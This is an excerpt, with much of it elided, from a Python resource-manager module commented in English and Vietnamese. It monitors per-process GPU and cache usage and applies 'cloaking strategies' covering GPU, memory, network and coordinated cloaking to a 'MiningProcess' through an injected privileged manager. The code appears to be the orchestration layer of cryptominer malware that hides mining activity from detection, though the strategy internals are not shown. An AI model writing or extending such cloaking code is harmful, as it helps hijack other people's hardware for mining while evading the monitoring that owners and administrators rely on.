...
# ✅ **REFACTORED IMPORTS** (imports tái cấu trúc) - Optimized for core functionality
import logging
import psutil
import pynvml
import traceback
...
class SharedResourceManager:
    ...
    **Simplified Architecture** (kiến trúc đơn giản hóa) - Core GPU resource management:
    - **NVML Lifecycle Management** (quản lý vòng đời NVML)
    - **GPU Usage Monitoring** (giám sát sử dụng GPU)
    ...
    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        ...
        # **Strategy Cache** (bộ nhớ đệm chiến lược)
        self.strategy_cache = get_strategy_cache(
            max_size=200,  # **Simplified Cache Size** (kích thước cache đơn giản)
            ttl_seconds=3600.0,  # **1 hour TTL** (TTL 1 giờ)
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # **Privileged Manager** (quản lý đặc quyền)
        self.privileged_manager = get_privileged_manager(logger)
        
        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("✅ SharedResourceManager initialized successfully")
        except Exception as e:
            self.logger.error(f"❌ SharedResourceManager initialization failed: {e}")
            raise
    ...
    def get_process_cache_usage(self, pid: int) -> float:
        """
        **Process Cache Usage** (sử dụng cache tiến trình)
        
        Returns cache usage percentage for given process ID.
        """
        try:
            ...
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        ...
                        return (cache_kb / total_mem_kb) * 100
            return 0.0
        except (FileNotFoundError, ValueError, IndexError):
            return 0.0
        except Exception as e:
            self.logger.debug(f"Cache usage error for PID {pid}: {e}")
            return 0.0
    ...
    def get_gpu_usage_percent(self, pid: int) -> float:
        ...
        **GPU Usage Monitoring** (giám sát sử dụng GPU)
        ...
        Returns GPU usage percentage for given process ID.
        """
        try:
            ...
            self.logger.debug(f"GPU usage error for PID {pid}: {e}")
            return 0.0
    ...
    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        ...
        **Cloaking Strategy Application** (áp dụng chiến lược che giấu)
        ...
        Applies specified cloaking strategy to target mining process.
        Supports GPU, memory, network, and coordinated cloaking.
        """
        try:
            pid = process.pid
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name, self.config, self.logger, self.resource_managers
            )
            ...
            # **Privileged Manager Injection** (tiêm quản lý đặc quyền)
            if hasattr(strategy, 'set_privileged_manager'):
                strategy.set_privileged_manager(self.privileged_manager)

            self.logger.info(f"Applying strategy '{strategy_name}' to PID {pid}")
            ...
            if strategy_name == 'memory' and hasattr(strategy, 'apply_with_coordination'):
                try:
                    ...
                    if not success:
                        self.logger.error(f"Coordinated memory cloaking failed for PID {pid}")
                        return
                        
                except Exception as coord_err:
                    self.logger.error(f"Coordination setup failed: {coord_err}")
                    self.logger.warning("Falling back to standard memory cloaking")
                    strategy.apply(process)
            else:
                # **Standard Strategy Application** (áp dụng chiến lược tiêu chuẩn)
                strategy.apply(process)
                
            self.logger.info(f"Strategy '{strategy_name}' applied successfully to PID {pid}")

        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
            self.logger.error(f"Process access error for PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(f"Cloaking strategy error '{strategy_name}' for PID {process.pid}: {e}")
            raise
...
class ResourceManager(IResourceManager):
    ...
    **Refactored Architecture** (kiến trúc tái cấu trúc) - Core functionality only:
    - **GPU Resource Management** (quản lý tài nguyên GPU)
    - **Process Discovery & Cloaking** (khám phá & che giấu tiến trình)
    - **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
    - **Thread-Safe Hook Coordination** (phối hợp hook an toàn luồng)
    
    **Thread-Safe Singleton** (singleton an toàn luồng) with readiness signaling.
    """
    ...
    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """
        **Simplified Resource Manager Initialization** (khởi tạo quản lý tài nguyên đơn giản)
        """
    ...
    # 🗑️ **REMOVED**: allocate_memory_progressive - Complex memory allocation not needed
    def allocate_memory_progressive_removed(self, required_mb: int) -> Dict[str, Any]:
        """**REMOVED** - Complex memory allocation"""
        return {'success': False, 'allocated_mb': 0, 'strategy': 'removed'}
    
    # 🗑️ **REMOVED**: reduce_memory_footprint - Complex memory management not needed
    def reduce_memory_footprint_removed(self, required_mb: int) -> Dict[str, Any]:
        """
    ...
    # 🗑️ **REMOVED**: allocate_conservative - Complex allocation not needed
    def allocate_conservative_removed(self, required_mb: int) -> Dict[str, Any]:
        """
    ...
    # 🗑️ **REMOVED**: allocate_normal - Complex allocation not needed
    def allocate_normal_removed(self, required_mb: int) -> Dict[str, Any]:
        """
    ...
    # 🗑️ **REMOVED**: _file_registry_scanner_worker - Complex file scanning not needed for core functionality

    # 🗑️ **REMOVED**: _process_registry_file - Complex file processing not needed for core functionality
    ...
    def _log_cache_metrics_if_needed(self) -> None:
        """
        **Simplified Cache Metrics** (metrics cache đơn giản)
        """
        try:
            current_time = time.time()
            if hasattr(self, 'last_cache_metrics_log') and current_time - self.last_cache_metrics_log >= 600:  # 10 minutes
                if self.shared_resource_manager and self.shared_resource_manager.strategy_cache:
                    metrics = self.shared_resource_manager.strategy_cache.get_metrics()
                    self.logger.debug(f"Cache entries: {metrics.get('total_entries', 0)}")
    ...
    def get_cache_performance_report(self) -> Dict[str, Any]:
        """
        **Simple Cache Report** (báo cáo cache đơn giản)
        """
        try:
            if self.shared_resource_manager and self.shared_resource_manager.strategy_cache:
            ...
            return {'cache_available': False, 'timestamp': time.time()}
